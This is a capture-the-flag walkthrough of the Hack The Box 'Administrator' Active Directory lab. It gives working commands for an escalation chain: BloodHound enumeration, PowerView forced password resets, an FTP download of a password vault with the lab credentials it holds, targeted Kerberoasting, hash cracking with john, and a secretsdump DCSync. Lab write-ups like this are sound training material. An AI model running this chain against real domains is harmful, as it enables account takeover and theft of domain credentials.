# Administrator 

![](./Images/image.png)

## Introduction

**Administrator** is an Active Directory-focused machine that highlights the importance of information gathering and analyzing relationships between domain users. It presents a logical privilege escalation chain using rights such as `GenericAll`, `ForceChangePassword`, `GenericWrite`, and `DCSync`.

The goal is to move laterally through user trust relationships to reach high-privileged access, leveraging tools like BloodHound, crackmapexec, WinRM, SMB, and pwsafe.

It’s a great lab for anyone looking to transition from theory to practice in Active Directory exploitation and understand how visibility into domain permissions can unlock powerful attack paths.

**Machine Information**

```
Username: Olivia 
Password: ichliebedich
```

## Enumeration

Nmap scan

![](./Images/image-1.png)

Collect data with bloodhound

```sh
bloodhound-python -c All -u Olivia -p 'ichliebedich' -dc administrator.htb -ns 10.10.11.42
```

![](./Images/image-3.png)


Check valid users on AD with `kerbrute`

```sh
cat 20250411113120_users.json | jq | grep samaccountname | awk '{print $2}' | cut -d '"' -f 2 > users.txt
```

![](./Images/image-4.png)

# Footprinting

**Bloodhound GUI - Enumeration**

![](./Images/image-5.png)

- `olivia@administrator.htb` → `GenericAll` on `michael@administrator.htb`

We can Force Change Password of `michael@administrator.htb`

```sh
. .\powerview.ps1
$UserPassword = ConvertTo-SecureString 'michaelPassword' -AsPlainText -Force
Set-DomainUserPassword -Identity 'michael' -AccountPassword $UserPassword -Credential $Cred
```

## Initial Foothold

![](./Images/image-6.png)

![](./Images/image-7.png)

- `michael@administrator.htb` → `ForceChangePassword` on `benjamin@administrator.htb`

```sh
. .\powerview.ps1
$UserPassword = ConvertTo-SecureString 'benjaminPassword' -AsPlainText -Force
Set-DomainUserPassword -Identity 'benjamin' -AccountPassword $UserPassword -Credential $Cred
```

![](./Images/image-8.png)

![](./Images/image-13.png)

- `benjamin@administrator.htb` → No special privileges, but had FTP access

```sh
┌──(kali㉿dipeua-pc)-[~/HackTheBox/Administrator/ftp]
└─$ ftp ftp://benjamin:benjaminPassword@administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
331 Password required
230 User logged in.
Remote system type is Windows_NT.
200 Type set to I.
ftp> ls
229 Entering Extended Passive Mode (|||62626|)
150 Opening ASCII mode data connection.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||62627|)
125 Data connection already open; Transfer starting.
100% |*******************************************************************************************************************************************************|   952        5.79 KiB/s    00:00 ETA
226 Transfer complete.
952 bytes received in 00:00 (5.77 KiB/s)
ftp> exit
221 Goodbye.
```

![](./Images/image-10.png)

![](./Images/image-11.png)


```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

![](./Images/image-14.png)

- `emily@administrator.htb` → `GenericWrite` on `ethan@administrator.htb`

```sh
. .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\emily', $SecPassword)
Set-DomainObject -Credential $Cred -Identity 'ethan' -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
Get-DomainSPNTicket -Credential $Cred -SPN 'nonexistent/BLAHBLAH'
```

![](./Images/image-12.png)

![](./Images/image-15.png)

```sh
┌──(kali㉿dipeua-pc)-[~/HackTheBox/Administrator]
└─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
limpbizkit       (?)     
1g 0:00:00:00 DONE (2025-04-13 09:52) 33.33g/s 170666p/s 170666c/s 170666C/s newzealand..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Privilege Escalation

```sh
impacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42
```

![](./Images/image-16.png)

**Pass The Hash**

![](./Images/image-17.png)